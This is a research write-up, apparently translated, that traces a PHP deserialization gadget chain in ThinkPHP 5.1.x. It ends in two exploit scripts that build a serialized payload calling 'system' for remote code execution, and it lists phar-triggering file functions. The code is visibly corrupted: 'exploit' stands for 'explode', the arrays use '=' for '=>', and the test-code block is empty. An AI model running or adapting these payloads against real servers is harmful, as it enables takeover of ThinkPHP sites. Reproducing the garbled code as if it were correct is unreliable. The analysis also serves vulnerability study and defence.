# ThinkPHP5.1.x Deserialization

Author: H3rmesk1t

Data: 2021.08.23

# Supplementary knowledge
## PHP deserialization principle
- PHP deserialization is to read a string and then deserialize the string into a php object

## Some magic methods will be automatically executed during PHP deserialization
|Method Name |Call Conditions |
|:---:|:---:|
__call| is called when calling an inaccessible or non-existent method
__callStatic | Called when calling an inaccessible or non-existent static method
__clone| is called when cloning the object, used to adjust the cloning behavior of the object
__construct | Called when building the object
__debuginfo | Called when var_dump() is called when printing object (when you don't want to print all properties) is suitable for PHP 5.6 version
__destruct |Explanationally destroyed object or script is called at the end
__get | Called when reading an inaccessible or non-existent property
__invoke| is called when an object is called in a function
__isset | Called when isset() or empty() is called for inaccessible or non-existent properties
__set | Called when assigning values ​​to inaccessible or non-existent properties
__set_state| When var_export() is called to export the class, this static method is called, using the return value of __set_state as the return value of var_export
__sleep | is called when using serialize, useful when you don't need to save all data from large objects
__toString| Called when a class is converted to a string
__unset | Called when unsetting an inaccessible or non-existent property
__wakeup| is called when unserialize is used, which can be used to initialize some objects.

## Common starting points for deserialization
- __wakeup: Will definitely call
- __destruct: Will definitely call
- __toString: When an object is deserialized, it is used as a string

## Common intermediate springboards for deserialization
- __toString: When an object is used as a string
- __get: Called when reading an inaccessible or non-existent property
- __set: Called when assigning values ​​to inaccessible or non-existent properties
- __isset: Called when calling `isset()` or `empty()` on an inaccessible or non-existent property, as shown in `$this->$func();`

## Common endpoints for deserialization
- __call: Called when calling an inaccessible or non-existent method
- call_user_func: Generally, the PHP code execution will be selected here
- call_user_func_array: Generally, the PHP code execution will be selected here

## Phar deserialization principle and features
- phar://pseudo protocol deserializes its `metadata` section in multiple functions
- The affected functions are not limited to the following
```
copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,
fileinode,filemtime,fileowner,fileperms,
fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,
is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,
imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,
get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo
```

# Vulnerability Environment
- Vulnerability testing environment: PHP7+ThinkPHP5.1.37
- Vulnerability Test Code application/index/controller/Index.php

```php
```

# Vulnerability Analysis
## Find the starting point of deserialization
- Global search `__destruct`, follow up `thinkphp/library/think/process/pipes/Windows.php`

<img src="https://pic.imgdb.cn/item/611fcede4907e2d39c30308c.png" alt="">

- `__destruct` calls the `removeFiles` method, and follow up and finds that the `file_exists` method exists, which can trigger `toString`, and `$files` is controllable

<img src="https://pic.imgdb.cn/item/611fcfe74907e2d39c32c677.png" alt="">

<img src="https://pic.imgdb.cn/item/611fd06f4907e2d39c34a503.png" alt="">

## Find the intermediate springboard for deserialization
- Find an object that implements the `__toString` method as a springboard, follow up `thinkphp/library/think/Collection.php`

<img src="https://pic.imgdb.cn/item/611fd0e54907e2d39c363e35.png" alt="">

<img src="https://pic.imgdb.cn/item/611fd1814907e2d39c3875d3.png" alt="">

- Find a `toArray` method that meets the conditions: `$ controllable variable - method (parameter controllable)`, so that the `__call` method of a certain class can be triggered

- Follow up on `thinkphp/library/think/model/concern/Conversion.php`, find a `$relation->visible($name); in the `toArray` method.

## Find deserialization code execution points
- You need to find a class that meets the following 2 conditions, search for `__call` globally, follow up `thinkphp/library/think/Request.php`
```a
There is no "visible" method in this class
Implemented the __call method
```

<img src="https://pic.imgdb.cn/item/612275f144eaada739f47ddf.png" alt="">

- The `$hook` here is controllable. You can design an array `$hook= {"visable"=>"arbitrary method"}`, but there is an `array_unshift($args, $this);` that will put `$this` on the first element of the `$arg` array, and can be in the following form `call_user_func_array([$obj,"arbitrary method"],[$this,arbitrary parameters]`
- But this form is difficult to execute code, so I tried to override the `filter` method to execute code, and found that the `input` method satisfies the conditions

```php
public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {
            // Get the original data
            return $data;
        }

        $name = (string) $name;
        if ('' != $name) {
            // parse name
            if (strpos($name, '/')) {
                list($name, $type) = exploit('/', $name);
            }

            $data = $this->getData($data, $name);

            if (is_null($data)) {
                return $default;
            }

            if (is_object($data)) {
                return $data;
            }
        }

        // parse filter
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            if (version_compare(PHP_VERSION, '7.1.0', '<')) {
                // Restore internal pointers consumed in array_walk_recursive when PHP version is lower than 7.1
                $this->arrayReset($data);
            }
        } else {
            $this->filterValue($data, $name, $fil
ter);
        }

        if (isset($type) && $data !== $default) {
            //Crew type conversion
            $this->typeCast($data, $type);
        }

        return $data;
    }
```
- But this method cannot be used directly. `$name` is an array. Since the previous judgment condition `is_array($data)` will report an error to terminate the program, this function cannot be used directly. Continue to find the function that calls the `input` method, follow up with the `param` method in `thinkphp/library/think/Request.php`. If `$name` is a string, you can control the execution of the variable code.

```php
public function param($name = '', $default = null, $filter = '')
    {
        if (!$this->mergeParam) {
            $method = $this->method(true);

            // Automatically get request variables
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }

            // Combine the current request parameter and the parameters in the URL address
            $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

            $this->mergeParam = true;
        }

        if (true === $name) {
            // Get an array containing file upload information
            $file = $this->file();
            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;

            return $this->input($data, '', $default, $filter);
        }

        return $this->input($this->param, $name, $default, $filter);
    }
```
- Continue to search upwards for the method that uses `param`, follow up on the `isAjax` or method in `thinkphp/library/think/Request.php`, and find that the `isAjax/isPjax` method can satisfy the first parameter of `param` is a string, because `$this->config` is also controllable

```php
public function isAjax($ajax = false)
    {
        $value = $this->server('HTTP_X_REQUESTED_WITH');
        $result = 'xmlhttprequest' == strtolower($value) ? true : false;

        if (true === $ajax) {
            return $result;
        }

        $result = $this->param($this->config['var_ajax']) ? true : $result;
        $this->mergeParam = false;
        return $result;
    }
```
```php
public function isPjax($pjax = false)
    {
        $result = !is_null($this->server('HTTP_X_PJAX')) ? true : false;

        if (true === $pjax) {
            return $result;
        }

        $result = $this->param($this->config['var_pjax']) ? true : $result;
        $this->mergeParam = false;
        return $result;
    }
```
## Construct deserialization utilization chain
- Refer to Master Mochazz's schematic diagram

<img src="https://pic.imgdb.cn/item/61227a3a44eaada739f759c1.png" alt="">

- exp-1

```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->data = ['H3rmesk1t' =new Request()];
        $this->append = ['H3rmesk1t' =[]];
    }
}
class Request{
    protected $filter;
    protected $hook = [];
    protected $config = [
        // Form request type camouflage variable
        'var_method' ='_method',
        // Form ajax camouflage variable
        'var_ajax' ='_ajax',
        // Form pjax camouflage variable
        'var_pjax' ='_pjax',
        // PATHINFO variable name is used for compatibility mode
        'var_pathinfo' ='s',
        // PATH_INFO compatible obtain
        'pathinfo_fetch' =['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // Default global filtering method: Separate multiple with commas
        'default_filter' ='',
        // Domain root, such as thinkphp.cn
        'url_domain_root' ='',
        // HTTPS proxy identifier
        'https_agent_name' ='',
        // IP proxy obtains the identifier
        'http_agent_ip' ='HTTP_X_REAL_IP',
        // URL pseudostatic suffix
        'url_html_suffix' ='html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ['var_ajax' =''];
        $this->hook = ['visible' =[$this,'isAjax']];
    }
}
namespace think\process\pipes;
use think\model\Pivot;

class Windows{
    private $files = [];
    public function __construct(){
        $this->files = [new Pivot()];
    }
}

namespace think\model;
use think\Model;

class Pivot extends Model{
}

use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

- exp-2

```php
<?php
namespace think;
abstract class Model{
protected $append = [];
    private $data = [];
    function __construct(){
        $this->data = ['H3rmesk1t' =new Request()];
        $this->append = ['H3rmesk1t' =[]];
    }
}
class Request{
    protected $filter;
    protected $hook = [];
    protected $config = [
        // Form request type camouflage variable
        'var_method' ='_method',
        // Form ajax camouflage variable
        'var_ajax' ='_ajax',
        // Form pjax camouflage variable
        'var_pjax' ='_pjax',
        // PATHINFO variable name is used for compatibility mode
        'var_pathinfo' ='s',
        // PATH_INFO compatible obtain
        'pathinfo_fetch' =['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // Default global filtering method: Separate multiple with commas
        'default_filter' ='',
        // Domain root, such as thinkphp.cn
        'url_domain_root' ='',
        // HTTPS proxy identifier
        'https_agent_name' ='',
        // IP proxy obtains the identifier
        'http_agent_ip' ='HTTP_X_REAL_IP',
        // URL pseudostatic suffix
        'url_html_suffix' ='html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ['var_pjax' =''];
        $this->hook = ['visible' =[$this,'isPjax']];
    }
}
namespace think\process\pipes;
use think\model\Pivot;

class Windows{
    private $files = [];
    public function __construct(){
        $this->files = [new Pivot()];
    }
}

namespace think\model;
use think\Model;

class Pivot extends Model{
}

use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

<img src="https://pic.imgdb.cn/item/61227c6e44eaada739f8c422.png" alt="">


## Vulnerability Exploit Conditions
- The ThinkPHP 5.1.X framework used to meet any of the following conditions:
1. Use deserialization operation directly without filtering
2. Files can be uploaded and the parameters of the file operation function are controllable, and special characters such as:/, phar are not filtered.